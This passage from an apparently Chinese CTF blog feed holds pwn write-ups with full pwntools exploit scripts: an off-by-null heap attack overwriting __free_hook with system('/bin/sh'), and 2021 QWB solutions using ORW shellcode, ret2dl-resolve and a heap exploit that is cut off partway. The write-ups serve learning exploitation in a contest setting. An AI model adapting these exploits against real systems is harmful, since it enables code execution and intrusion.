class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./text'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>) </span><br><span class="line">    p.sendline(str(num))   </span><br><span class="line">    p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?\n'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line"> <span class="comment">#1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x4f0</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#按照顺序释放A、C、D，形成largebins 链表。</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#释放chunk B，让chunk B和chunk C产生合并</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#让old chunk C的 old fd 与old bk保留在new chunk 底部。</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x470</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line"><span class="comment">#复原chunk</span></span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。</span></span><br><span class="line"><span class="comment">#(这里体现方法的一个弊端，如果`\n`不能替换‘\x00’就需要题目有show功能)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>) <span class="comment">#bk</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>) </span><br><span class="line">    edit(<span class="number">0</span>,p8(<span class="number">0</span>)*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    fd=(u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span>)</span><br><span class="line">    <span class="comment">#fd=p.recvline()</span></span><br><span class="line">    print(hex(fd))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x438</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(fd))</span><br><span class="line"><span class="comment">#通过new chunk B修改  old chunk C size 为fake size。通过new chunk B修改  old chunk C size 为fake size。（这里就用残留的0x460）通过new chunk C 修改隔离chunk的`prevsize`值为fake size，</span></span><br><span class="line">    edit(<span class="number">3</span>,p8(<span class="number">0</span>)*<span class="number">0x430</span>+p64(<span class="number">0x460</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    print(hex(fd))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    main_arena=(u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span>)</span><br><span class="line">    <span class="comment">#fd=p.recvline()</span></span><br><span class="line">    print(hex(main_arena))</span><br><span class="line">    malloc_hook=main_arena<span class="number">-0x10</span></span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">5</span>)</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x420</span>*p8(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x111</span>)+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">    addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc_hook=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">5</span>)</span><br><span class="line">    log.info(<span class="string">'base:'</span>+hex(x.libcbase))</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">    print(<span class="string">'ok2'</span>)</span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    edit(<span class="number">9</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">    print(<span class="string">'ok3'</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">'ok4'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./text'</span>)</span><br><span class="line">pwn()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>off by null 自从qwb被打懵后一直想了解这个知识，但又是毕业那些一大堆事情。同时tcl看了很多文章才看懂。感谢wjh爷爷和nopnoping爷爷的文章。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p><p><a href="http://blog.wjhwjhn.com/archives/193/" target="_blank" rel="noopener">http://blog.wjhwjhn.com/archives/193/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人理解off by null 是 off by one的一种特例, off by null指我们可以控制堆块向下一个堆块溢出一个字节的数据，而该数据只能为’\x00’的情况。如果像常规off by one 是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2021qwb-pwn-初赛-wp</title>
    <link href="lexsd6.github.io/2021/06/26/2021qwb%20pwn%20wp/"/>
    <id>lexsd6.github.io/2021/06/26/2021qwb%20pwn%20wp/</id>
    <published>2021-06-26T02:22:38.000Z</published>
    <updated>2021-07-28T16:21:48.203Z</updated>
    
    <content type="html"><![CDATA[<p>tcl,逆向能力薄弱的我被qwb打傻了.赛后复现时,发现好多题思路是对的.卡在了逆向反推上面.但反过来,在赛后看了很多大牛的博客后,也学习到很多知识,想这段时间忙完后单独写几篇来坐坐笔记。<a id="more"></a></p><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>这道题在创建chunk时，存在有数组越界导致我们可以劫持got表，从而劫持了exit那些函数。再通过整数溢出扩大shell_code写入的范围。同时，由于execve导致我们只能通过orw（open read write）的方法读flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'39.105.131.68'</span>,<span class="number">12354</span>)</span><br><span class="line"><span class="comment">#process('./pwn2')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="comment">#p.recvuntil('content')</span></span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil('index')</span></span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">-13</span>,<span class="number">0xffffffff</span>+<span class="number">1</span>,asm(<span class="string">'''</span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> mov rdi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x0;</span></span><br><span class="line"><span class="string"> mov rsi, 0x60;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x2;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x68;</span></span><br><span class="line"><span class="string"> mov rdi, 0x3;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x68;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> '''</span>))</span><br><span class="line"><span class="comment">#free(-6)</span></span><br><span class="line"><span class="comment">#add(1,7,'w'*0x7)</span></span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line"><span class="comment">#free(-13)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line">p.sendline(<span class="string">'/flag\x00'</span>)</span><br><span class="line">free(<span class="number">-6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="no-output"><a href="#no-output" class="headerlink" title="no_output"></a>no_output</h2><p>题目有的阴间，ban了标准输出而且我IDA F5的代码又有问题识别不了libc函数（太菜了）。导致只能慢慢手撕汇编和动态gdb。通过合理覆盖，让 <code>read(3,xx,xx)</code>变为<code>read(0,xx,xx)</code>写入‘hello_boy\x00’绕过cmp。</p><p>再通过’-0x80000000/-1==0’的特性触发signal，进入栈溢出的read，ret2dl-resolve get shall.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./test'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('39.105.138.97',1234)</span></span><br><span class="line">p=process(<span class="string">'./test'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'\x00\x00\n'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">'w'</span>*(<span class="number">0x30</span><span class="number">-16</span>)+<span class="string">'hello_boy\x00\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(str(<span class="number">-0x80000000</span>))</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">rop = ROP(<span class="string">'./test'</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(e, symbol=<span class="string">"system"</span>, args=[<span class="string">"/bin/sh"</span>]) </span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr) </span><br><span class="line">rop.ret2dlresolve(dlresolve) </span><br><span class="line">raw_rop = rop.chain() </span><br><span class="line">print(rop.dump())</span><br><span class="line">print(hex(dlresolve.data_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*(<span class="number">0x50</span><span class="number">-4</span>)+raw_rop)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="baby-diary"><a href="#baby-diary" class="headerlink" title="baby_diary"></a>baby_diary</h2><p>典型的高版本all-off-null,不同的是在我们在对面chunk写入信息后,会根据我们的写入,计算一个半字节并放入我们输入信息后.当我们出入全是’\x00’,那个半字节就是’\x0’,若不是’\x00则是非’\x0’的办字节.因此我们在输入时,至少影响一个半的字节.因此我们只能通过爆破法来求解.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="comment">#sh=process('./baby_diary')</span></span><br><span class="line"><span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">elf=ELF(<span class="string">'./baby_diary'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc-2.31.so')</span></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content=<span class="string">'/bin/sh\x00'</span>)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4ba0</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x600</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)<span 